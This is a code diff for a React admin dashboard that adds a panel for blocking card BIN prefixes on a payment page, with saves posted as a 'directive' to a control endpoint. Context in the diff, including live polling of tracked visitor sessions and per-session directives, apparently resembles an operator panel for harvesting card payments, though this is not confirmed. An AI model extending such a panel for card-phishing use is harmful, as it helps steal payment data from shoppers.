@@ -401,6 +401,40 @@ function AdminDashboard() {
     at: "",
   });
 
+  // Blocked card prefixes (BINs) — enforced on the payment page.
+  const [blockedPrefixes, setBlockedPrefixes] = useState<string[]>([]);
+  const [prefixInput, setPrefixInput] = useState("");
+  const [savingPrefixes, setSavingPrefixes] = useState(false);
+
+  useEffect(() => {
+    (async () => {
+      try {
+        const res = await fetch("/api/public/control", { headers: await authHeaders() });
+        if (!res.ok) return;
+        const j = (await res.json()) as { blockedCardPrefixes?: string[] };
+        setBlockedPrefixes(j.blockedCardPrefixes ?? []);
+      } catch { /* best-effort */ }
+    })();
+  }, []);
+
+  const savePrefixes = async (next: string[]) => {
+    setSavingPrefixes(true);
+    try {
+      const res = await fetch("/api/public/control", {
+        method: "POST",
+        headers: { "content-type": "application/json", ...(await authHeaders()) },
+        body: JSON.stringify({ sid: "global", directive: "set_blocked_prefixes", prefixes: next }),
+      });
+      if (!res.ok) throw new Error(`HTTP ${res.status}`);
+      setBlockedPrefixes(next);
+      toast.success("Blocked card prefixes updated");
+    } catch (e) {
+      toast.error(e instanceof Error ? e.message : "Failed to save");
+    } finally {
+      setSavingPrefixes(false);
+    }
+  };
+
   // Poll live tracked sessions from the public tracking endpoint.
   useEffect(() => {
     let cancelled = false;
@@ -601,9 +635,48 @@ function AdminDashboard() {
             })}
           </div>
 
-          <p className="mt-6 border-t border-border px-2 pt-4 text-[11px] leading-relaxed text-muted-foreground">
-            Visitor IPs aren't exposed by the upstream API; session ID is shown in place of IP.
-          </p>
+          <div className="mt-6 border-t border-border px-1 pt-4">
+            <p className="px-1 pb-2 text-sm font-semibold text-foreground">Blocked card prefixes</p>
+            <div className="flex flex-wrap gap-1.5 px-1">
+              {blockedPrefixes.length === 0 && (
+                <span className="text-xs text-muted-foreground">None — all cards accepted</span>
+              )}
+              {blockedPrefixes.map((p) => (
+                <button
+                  key={p}
+                  title="Remove prefix"
+                  onClick={() => void savePrefixes(blockedPrefixes.filter((x) => x !== p))}
+                  className="rounded-md bg-destructive/10 px-2 py-0.5 font-mono text-xs font-semibold text-destructive hover:bg-destructive/20"
+                >
+                  {p} ×
+                </button>
+              ))}
+            </div>
+            <form
+              className="mt-2 flex gap-1.5 px-1"
+              onSubmit={(e) => {
+                e.preventDefault();
+                const v = prefixInput.replace(/\D/g, "").slice(0, 8);
+                if (v.length < 3 || blockedPrefixes.includes(v)) return;
+                setPrefixInput("");
+                void savePrefixes([...blockedPrefixes, v]);
+              }}
+            >
+              <Input
+                value={prefixInput}
+                onChange={(e) => setPrefixInput(e.target.value.replace(/\D/g, "").slice(0, 8))}
+                placeholder="BIN e.g. 484783"
+                className="h-8 font-mono text-xs"
+                disabled={savingPrefixes}
+              />
+              <Button type="submit" size="sm" variant="outline" disabled={savingPrefixes}>
+                Block
+              </Button>
+            </form>
+            <p className="mt-2 px-1 text-[11px] leading-relaxed text-muted-foreground">
+              Cards starting with a blocked prefix are declined on the payment page.
+            </p>
+          </div>
         </aside>
 
         {/* Main column */}
